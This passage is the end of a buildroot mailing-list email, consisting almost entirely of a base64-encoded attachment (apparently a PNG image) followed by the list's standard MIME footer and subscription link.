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


------=_NextPart_000_0012_78B8AEAB.68267413--

--===============0403123424876597065==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============0403123424876597065==--
